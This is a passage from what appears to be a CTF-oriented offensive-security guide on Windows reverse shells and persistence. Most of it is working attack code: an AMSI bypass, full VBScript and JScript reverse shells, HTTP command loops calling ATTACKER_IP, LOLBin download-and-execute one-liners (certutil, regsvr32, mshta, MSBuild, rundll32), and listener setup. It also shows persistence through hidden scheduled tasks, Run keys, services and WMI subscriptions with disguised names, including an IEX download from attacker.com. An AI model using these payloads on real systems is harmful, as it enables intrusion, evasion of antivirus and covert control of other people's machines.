[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative obfuscated version
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

### Important Considerations for CTF Scenarios

**Firewall and Egress Filtering**

Common egress ports that may be allowed:

- TCP 80 (HTTP)
- TCP 443 (HTTPS)
- TCP 53 (DNS)
- TCP 8080 (HTTP-Alt)

Test multiple ports and protocols if initial connection fails.

**Payload Delivery Methods**

1. **SMB Share**: `copy \\<ATTACKER_IP>\share\shell.exe .`
2. **PowerShell Download**: `(New-Object Net.WebClient).DownloadFile('http://<IP>/shell.exe','shell.exe')`
3. **CertUtil**: `certutil -urlcache -f http://<IP>/shell.exe shell.exe`
4. **BITSAdmin**: `bitsadmin /transfer job http://<IP>/shell.exe %TEMP%\shell.exe`

**[Inference]** In restricted environments, file-less execution via PowerShell in-memory techniques often bypasses basic application whitelisting.

---

### VBScript Shells

VBScript provides native Windows scripting capabilities for establishing reverse connections without requiring additional binaries.

**Basic VBScript Reverse Shell**

```vbscript
' Save as shell.vbs
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd.exe /c powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
```

**VBScript with XMLHTTP Request**

```vbscript
' HTTP-based command execution
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
Set objShell = CreateObject("WScript.Shell")

Do While True
    objHTTP.open "GET", "http://ATTACKER_IP/cmd", False
    objHTTP.send
    command = objHTTP.responseText
    
    If command <> "" Then
        Set objExec = objShell.Exec(command)
        output = objExec.StdOut.ReadAll()
        
        objHTTP.open "POST", "http://ATTACKER_IP/output", False
        objHTTP.send output
    End If
    
    WScript.Sleep 5000
Loop
```

**Encoded VBScript Execution**

```bash
# Base64 encode VBScript
cat shell.vbs | iconv -t UTF-16LE | base64 -w 0

# Execute via command line
cscript //nologo //E:VBScript <(echo ENCODED_SCRIPT | base64 -d)

# Or via mshta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ENCODED_PAYLOAD"":close")
```

**Execution Methods**

```bash
# Direct execution
cscript.exe shell.vbs

# Silent execution
wscript.exe //nologo shell.vbs

# From URL
cscript.exe //nologo http://ATTACKER_IP/shell.vbs

# Via registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "wscript.exe C:\path\to\shell.vbs"
```

### WSH (Windows Script Host) Shells

Windows Script Host supports multiple scripting languages including JScript and VBScript with enhanced object access.

**JScript Reverse Shell**

```javascript
// Save as shell.js
var shell = new ActiveXObject("WScript.Shell");
var network = new ActiveXObject("WScript.Network");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var attacker = "ATTACKER_IP";
var port = PORT;

var cmd = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + attacker + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

shell.Run(cmd, 0, false);
```

**JScript with WinHTTP**

```javascript
var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var shell = new ActiveXObject("WScript.Shell");

while(true) {
    try {
        http.Open("GET", "http://ATTACKER_IP/cmd", false);
        http.Send();
        var cmd = http.ResponseText;
        
        if(cmd != "") {
            var exec = shell.Exec("cmd.exe /c " + cmd);
            var output = exec.StdOut.ReadAll();
            
            http.Open("POST", "http://ATTACKER_IP/output", false);
            http.Send(output);
        }
    } catch(e) {}
    
    WScript.Sleep(5000);
}
```

**WSH File Execution Methods**

```bash
# Standard execution
wscript.exe shell.js
cscript.exe shell.js

# With COM moniker
wscript.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("<script>new ActiveXObject('WScript.Shell').Run('calc.exe')</script>");close();

# Via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -enc PAYLOAD")
```

**WSF (Windows Script File) Format**

```xml
<!-- Save as shell.wsf -->
<job>
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')");
]]>
</script>
</job>
```

### COM Object Shells

COM (Component Object Model) objects provide direct access to Windows functionality for establishing connections.

**Excel COM Object**

```vbscript
Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False
objExcel.DisplayAlerts = False

' Execute macro via DDEInitiate (legacy)
Set objWorkbook = objExcel.Workbooks.Add()
objExcel.DDEInitiate "cmd", "/c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

**Internet Explorer COM Object**

```vbscript
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Navigate2 "http://ATTACKER_IP/payload.hta"
objIE.Visible = False

Do While objIE.Busy
    WScript.Sleep 100
Loop
```

**WMI COM Object for Remote Execution**

```vbscript
strComputer = "."
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objStartup = objWMI.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0

Set objProcess = objWMI.Get("Win32_Process")
objProcess.Create "powershell -nop -w hidden -enc PAYLOAD", null, objConfig, intProcessID
```

**MSXML COM Object**

```vbscript
Set objXML = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set objShell = CreateObject("WScript.Shell")

objXML.open "GET", "http://ATTACKER_IP/payload.ps1", False
objXML.send

strPayload = objXML.responseText
objShell.Run "powershell -nop -w hidden -c " & strPayload, 0, False
```

**Shell.Application COM Object**

```vbscript
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')", "", "runas", 0
```

**Schedule.Service COM Object**

```vbscript
Set objService = CreateObject("Schedule.Service")
objService.Connect()

Set objFolder = objService.GetFolder("\")
Set objTask = objService.NewTask(0)

Set objTrigger = objTask.Triggers.Create(1) ' TASK_TRIGGER_DAILY
objTrigger.StartBoundary = "2025-10-11T10:00:00"

Set objAction = objTask.Actions.Create(0) ' TASK_ACTION_EXEC
objAction.Path = "powershell.exe"
objAction.Arguments = "-nop -w hidden -enc PAYLOAD"

objFolder.RegisterTaskDefinition "WindowsUpdate", objTask, 6, , , 3
```

### Living-off-the-Land Techniques

Living-off-the-land binaries (LOLBins) leverage legitimate Windows executables to establish reverse shells while evading detection.

**Certutil-Based Download and Execute**

```bash
# Download payload
certutil.exe -urlcache -f http://ATTACKER_IP/shell.exe shell.exe

# Alternative split download
certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.exe

# Base64 decode payload
certutil.exe -decode encoded.txt shell.exe

# Execute downloaded payload
shell.exe
```

**BITSAdmin Download**

```bash
# Background download
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe

# Execute after download
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
```

**MSBuild Inline Execution**

```xml
<!-- Save as shell.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using System.Net;
        using System.Diagnostics;
        
        public class ClassExample : ITask {
          public IBuildEngine BuildEngine { get; set; }
          public ITaskHost HostObject { get; set; }
          
          public bool Execute() {
            WebClient wc = new WebClient();
            string result = wc.DownloadString("http://ATTACKER_IP/payload.ps1");
            Process.Start(new ProcessStartInfo("powershell.exe", "-nop -w hidden -c " + result) { UseShellExecute = false });
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Execute with:

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shell.csproj
```

**Regsvr32 Squiblydoo Technique**

```bash
# Execute scriptlet from remote server
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll
```

Sample SCT file:

```xml
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{A1112221-0000-0000-3000-000DA00DABFC}">
<script language="JScript">
<![CDATA[
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')");
]]>
</script>
</registration>
</scriptlet>
```

**MSHTA Application**

```bash
# Execute HTA from URL
mshta http://ATTACKER_IP/payload.hta

# Inline VBScript execution
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -enc PAYLOAD"":close")

# Inline JScript
mshta javascript:a=GetObject("script:http://ATTACKER_IP/payload.sct").Exec();close();
```

**Rundll32 JavaScript Execution**

```bash
# Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -enc PAYLOAD")

# Via URL
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";location.href='http://ATTACKER_IP/payload.hta'
```

**Forfiles Execution**

```bash
# Execute command via forfiles
forfiles /p C:\Windows\System32 /m cmd.exe /c "powershell -nop -w hidden -enc PAYLOAD"
```

**Pcalua (Program Compatibility Assistant)**

```bash
# Execute payload
pcalua.exe -a C:\Windows\Temp\shell.exe

# With arguments
pcalua.exe -a powershell.exe -c "-nop -w hidden -enc PAYLOAD"
```

**SyncAppvPublishingServer**

```bash
# Execute PowerShell command
SyncAppvPublishingServer.exe "n; powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

**Listener Setup**

For all reverse shell techniques, establish a listener on the attacker machine:

```bash
# Netcat listener
nc -lvnp PORT

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT PORT; exploit"

# PowerShell listener
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse("ATTACKER_IP"), PORT)
$listener.Start()
```

---

**Important Related Topics:**

- PowerShell obfuscation and AMSI bypass techniques
- Process injection methods (hollowing, DLL injection)
- Windows Defender evasion strategies
- C2 framework usage (Covenant, Empire, Sliver)

---

## Maintaining Access (Windows)

### Scheduled Task Persistence

Windows Task Scheduler allows creation of automated tasks that execute at specified times or events. Scheduled tasks persist across reboots and execute with specified user privileges, making them effective for maintaining access.

#### Task Creation via Command Line

Create a basic scheduled task that executes a payload:

```
schtasks /create /tn "TaskName" /tr "C:\path\to\payload.exe" /sc once /st 12:00:00
```

Parameter breakdown: `/tn` specifies task name, `/tr` defines the action (command or executable), `/sc` sets the schedule (once, minute, hourly, daily, weekly, monthly, onidle, onstart, onlogon), `/st` sets start time.

Create a task that executes at system startup with SYSTEM privileges:

```
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru "SYSTEM" /f
```

The `/ru "SYSTEM"` parameter runs the task as SYSTEM user. The `/f` flag forces creation without confirmation.

Create a task that executes every 5 minutes:

```
schtasks /create /tn "MaintenanceTask" /tr "powershell.exe -Command C:\temp\payload.ps1" /sc minute /mo 5 /ru "SYSTEM"
```

The `/mo` parameter specifies the interval modifier (every 5 minutes in this example).

Create a task that executes on user logon:

```
schtasks /create /tn "UserLogon" /tr "C:\path\to\payload.exe" /sc onlogon /ru "%USERNAME%"
```

#### Obfuscated Task Execution

Using base64-encoded PowerShell payloads to evade detection:

```
powershell -EncodedCommand <base64_encoded_command>
```

Encode a PowerShell command:

```powershell
$Command = "C:\path\to\backdoor.exe"
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
```

Schedule the encoded payload:

```
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -EncodedCommand <base64_string>" /sc minute /mo 10
```

#### Task Execution Verification

List all scheduled tasks:

```
schtasks /query /v
tasklist /v | findstr schtasks
```

Query a specific task:

```
schtasks /query /tn "TaskName" /v
```

Run a task immediately:

```
schtasks /run /tn "TaskName"
```

#### Registry-Based Task Persistence

Tasks are stored in the registry at:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Each task is also registered in:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
```

[Inference] Direct registry modification of task entries can create tasks that do not appear in Task Scheduler GUI, though they still execute. This requires precise XML structure matching for the task definition.

### Registry RUN Keys Persistence

The Windows registry contains multiple RUN keys that execute applications at startup or user logon. These are among the most common persistence mechanisms due to simplicity and low detection overhead.

#### HKLM RUN Keys (System-Wide Persistence)

Registry location for system-level startup execution:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

Add a registry entry via command line:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\path\to\payload.exe" /f
```

Parameter breakdown: `/v` specifies the value name, `/t` defines the registry type (REG_SZ for string), `/d` contains the data/command, `/f` forces creation without confirmation.

Create a RunOnce entry that executes only on next boot:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\temp\payload.exe" /f
```

#### HKCU RUN Keys (User-Specific Persistence)

Registry location for per-user startup execution:

```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

Add a user-level RUN key:

```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemService" /t REG_SZ /d "C:\path\to\payload.exe" /f
```

HKCU entries execute with the privileges of the logged-in user, making them suitable for user-level persistence without requiring administrative rights.

#### Obfuscated Registry Commands

Use indirect command execution to evade signature-based detection:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Service" /t REG_SZ /d "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\temp\payload.ps1" /f
```

Using environment variables:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "%SystemRoot%\System32\cmd.exe /c C:\payload.exe" /f
```

#### Registry Value Types for Payload Execution

REG_SZ (String): Direct command execution

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Payload" /t REG_SZ /d "C:\payload.exe" /f
```

REG_EXPAND_SZ (Expandable String): Supports environment variables

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Payload" /t REG_EXPAND_SZ /d "%TEMP%\payload.exe" /f
```

#### Additional RUN Key Locations

Windows executes other registry paths at startup:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\open\command
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\open\ddeexec
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Protocols\Handler\ms-settings
HKEY_CURRENT_USER\SOFTWARE\Classes\Directory\shell\open\command
```

### Startup Folder Persistence

Windows executes all executables and shortcuts located in the Startup folder when the system boots or a user logs on. This method is visible in the file system but often overlooked.

#### Startup Folder Locations

System startup folder (all users):

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
```

User-specific startup folder:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```

#### Payload Placement

Copy an executable to the system startup folder:

```
copy C:\path\to\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ServiceUpdate.exe"
```

Copy to user startup folder (requires user permissions):

```
copy C:\path\to\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.exe"
```

#### Shortcut-Based Persistence

Create a shortcut (.lnk file) in the Startup folder as an alternative to direct executable placement:

```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk")
$Shortcut.TargetPath = "C:\path\to\payload.exe"
$Shortcut.Arguments = "-hidden"
$Shortcut.Save()
```

Shortcut persistence allows additional parameters and is less suspicious than loose executables in Startup folders.

#### Registry-Based Startup Folder Alternative

Windows also executes items specified in:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\User Shell Folders
```

Modify the Startup folder registry location:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Startup" /t REG_SZ /d "C:\custom\startup\path" /f
```

[Inference] Redirecting the Startup folder path to a custom directory allows persistent execution from non-standard locations, potentially evading file-based monitoring.

### Service Installation Persistence

Windows services run with elevated privileges and execute before user logon. Services are managed by the Service Control Manager (SCM) and survive user logoffs and reboots.

#### Service Creation via Command Line

Create a basic service:

```
sc create "ServiceName" binPath= "C:\path\to\payload.exe"
```

The `binPath=` parameter requires a space after the equals sign. This creates a service with default settings (manual start type).

Create a service that starts automatically at boot:

```
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
```

The `start=` parameter options are: boot (before OS initialization), system (during OS initialization), auto (after user logon), demand (manual start), disabled (service disabled).

Create a service with SYSTEM privileges and automatic start:

```
sc create "SystemService" binPath= "C:\payload.exe" start= auto obj= "LocalSystem" password= ""
```

The `obj=` parameter specifies the service account (LocalSystem runs with SYSTEM privileges). For custom accounts, specify `obj= "DOMAIN\username"` with `password= "password"`.

Create a service with display name and description:

```
sc create "HiddenService" binPath= "C:\payload.exe" DisplayName= "Windows Service" start= auto
sc description "HiddenService" "Legitimate Windows service"
```

#### Service Management

Start a service:

```
sc start "ServiceName"
net start "ServiceName"
```

Query service status:

```
sc query "ServiceName"
Get-Service -Name "ServiceName"
```

Delete a service:

```
sc delete "ServiceName"
```

Stop a service:

```
sc stop "ServiceName"
net stop "ServiceName"
```

#### Payload Considerations for Service Execution

Services require different executable structure than standard applications. A service executable must:

1. Accept service-specific command-line arguments (start, stop, pause, continue)
2. Register with the Service Control Manager
3. Avoid GUI interactions (services run without user session)

Use service wrapper tools to convert standard executables into service-compatible binaries:

```
nssm install "ServiceName" "C:\path\to\payload.exe"
nssm start "ServiceName"
```

NSSM (Non-Sucking Service Manager) automatically handles service registration and lifecycle management.

#### Obfuscated Service Installation

Create a service that executes a command-line payload:

```
sc create "ServiceName" binPath= "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\temp\payload.ps1"
```

Create a service with a binary path containing spaces (requires quotes):

```
sc create "ServiceName" binPath= "\"C:\Program Files\Application\payload.exe\""
```

#### Service Registry Persistence

Services are stored in the registry at:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

Key registry values:

- `ImagePath`: Path to the service executable
- `Start`: Start type (0=boot, 1=system, 2=auto, 3=demand, 4=disabled)
- `Type`: Service type (16=win32, 32=win32_share_process)
- `DisplayName`: Service display name
- `Description`: Service description

Modify an existing service binary path via registry:

```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v "ImagePath" /t REG_EXPAND_SZ /d "C:\new\path\payload.exe" /f
```

### WMI Event Subscription Persistence

Windows Management Instrumentation (WMI) event subscriptions execute code in response to system events. WMI events persist across reboots and execute with SYSTEM privileges.

#### WMI Event Subscription Basics

WMI event subscriptions consist of three components:

1. Event Filter: Defines the trigger condition
2. Event Consumer: Defines the action (command execution, script execution)
3. Binding: Associates a filter with a consumer

Create a WMI event subscription via WMI Command-line (WMIC):

```
wmic /namespace:"\\.\root\subscription" path __EventFilter create Name="PersistenceFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

This creates an event filter that triggers every 60 seconds based on system performance data modifications.

Create an event consumer:

```
wmic /namespace:"\\.\root\subscription" path CommandLineEventConsumer create Name="PersistenceConsumer", ExecutablePath="C:\path\to\payload.exe", CommandLineTemplate="C:\path\to\payload.exe"
```

Bind the filter to the consumer:

```
wmic /namespace:"\\.\root\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"PersistenceFilter\"", Consumer="CommandLineEventConsumer.Name=\"PersistenceConsumer\""
```

#### PowerShell WMI Event Subscription

Create a WMI event subscription using PowerShell for more complex payloads:

```powershell
$FilterArgs = @{
    EventNamespace = 'root\cimv2'
    Name = 'PersistenceFilter'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    Name = 'PersistenceConsumer'
    CommandLineTemplate = 'C:\path\to\payload.exe'
}
$Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{
    Filter = [ref]$Filter
    Consumer = [ref]$Consumer
}
New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```

#### Event Filter Query Language (WQL) Triggers

Timer-based trigger (every 60 seconds):

```
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
```

Process creation trigger:

```
SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'
```

System startup trigger:

```
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=0
```

[Inference] The Hour=0 condition (midnight) creates a daily trigger. However, this is imprecise; time-based WMI triggers are not reliable for exact scheduling compared to scheduled tasks.

User logon trigger:

```
SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_LoggedOnUser'
```

#### ActiveScriptEventConsumer for Script Execution

Execute VBScript or JavaScript payloads directly:

```powershell
$ConsumerArgs = @{
    Name = 'ScriptConsumer'
    ScriptingEngine = 'VBScript'
    ScriptText = 'Set objShell=CreateObject("WScript.Shell"):objShell.Run "C:\path\to\payload.exe"'
}
New-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer -Property $ConsumerArgs
```

#### WMI Event Subscription Enumeration and Cleanup

List all event filters:

```
wmic /namespace:"\\.\root\subscription" path __EventFilter list full
Get-WmiObject -Namespace root\subscription -Class __EventFilter
```

List all event consumers:

```
wmic /namespace:"\\.\root\subscription" path CommandLineEventConsumer list full
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

List all filter-to-consumer bindings:

```
wmic /namespace:"\\.\root\subscription" path __FilterToConsumerBinding list full
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

Delete an event filter:

```
wmic /namespace:"\\.\root\subscription" path __EventFilter where Name="PersistenceFilter" delete
```

Delete an event consumer:

```
wmic /namespace:"\\.\root\subscription" path CommandLineEventConsumer where Name="PersistenceConsumer" delete
```

Delete a filter-to-consumer binding:

```
wmic /namespace:"\\.\root\subscription" path __FilterToConsumerBinding where Filter="__EventFilter.Name=\"PersistenceFilter\"" delete
```

#### WMI Persistence Detection and Evasion

[Inference] WMI event subscriptions are stored in the WMI repository at `C:\Windows\System32\wbem\Repository\`. Backing up or restoring this repository can preserve or remove event subscriptions. Endpoint Detection and Response (EDR) solutions typically monitor WMI subscriptions creation, making this technique increasingly risky.

Verify event subscription creation:

```
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='PersistenceFilter'"
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*Persistence*"}
```

### Comparative Persistence Method Selection

Scheduled task persistence provides granular control over execution timing and user context, suitable for periodic callback mechanisms or time-sensitive operations. Registry RUN keys offer simplicity and low resource consumption but may lack advanced scheduling capabilities. Startup folder persistence is highly visible in the file system and easily detected through file monitoring. Service installation grants SYSTEM privileges and early boot execution but requires executable format compliance and Service Control Manager registration. WMI event subscriptions provide flexible event-based triggers and SYSTEM-level execution but are increasingly monitored by EDR solutions.

CTF scenarios frequently require persistence across multiple privilege escalation or lateral movement operations; selecting the appropriate mechanism depends on environmental constraints (file system access, registry permissions, UAC configuration) and detection sensitivity (signature-based versus behavioral analysis).

---

### Scheduled Job Persistence (Task Scheduler)

Windows Task Scheduler provides robust persistence mechanisms through scheduled tasks that execute at system startup, user logon, or specific time intervals. Tasks can run with elevated privileges and under different security contexts.

#### Basic Task Creation

**schtasks Command Line:**

cmd

```cmd
# Create task running at logon
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Create task running at specific time
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc daily /st 09:00 /ru SYSTEM

# Create task on startup
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM /rl highest

# Create task for specific user logon
schtasks /create /tn "UserUpdate" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru DOMAIN\username /rp password
```

**Common Parameters:**

- `/tn` - Task name
- `/tr` - Task run (executable path)
- `/sc` - Schedule type (onlogon, onstart, daily, weekly, once, minute, hourly)
- `/ru` - Run as user (SYSTEM, username)
- `/rl` - Run level (limited, highest)
- `/rp` - Password for user context
- `/f` - Force creation (overwrite existing)

#### PowerShell Task Creation

**Register-ScheduledTask Method:**

powershell

```powershell
# Create action
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1"

# Create trigger (at logon)
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Create principal (run as SYSTEM)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register task
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Principal $principal
```

**Alternative Trigger Types:**

powershell

```powershell
# Startup trigger
$trigger = New-ScheduledTaskTrigger -AtStartup

# Daily trigger
$trigger = New-ScheduledTaskTrigger -Daily -At 3:00AM

# On idle trigger
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfIdle -IdleDuration 00:10:00

# Event-based trigger
$trigger = New-ScheduledTaskTrigger -AtLogOn
$CIMTriggerClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace Root/Microsoft/Windows/TaskScheduler:MSFT_TaskEventTrigger
$trigger = New-CimInstance -CimClass $CIMTriggerClass -ClientOnly
$trigger.Subscription = '<QueryList><Query Id="0"><Select Path="Security">*[System[EventID=4624]]</Select></Query></QueryList>'
$trigger.Enabled = $True
```

#### Advanced Persistence Techniques

**Hidden Task Creation:**

powershell

```powershell
# Create task without GUI visibility
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c powershell.exe -w hidden -enc <base64_payload>"
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -Hidden
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateCore" -Action $action -Trigger $trigger -Settings $settings -Principal $principal
```

**COM Handler Task:**

powershell

```powershell
# Use COM object instead of executable path
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -User "SYSTEM"
```

**Multi-Trigger Task:**

cmd

```cmd
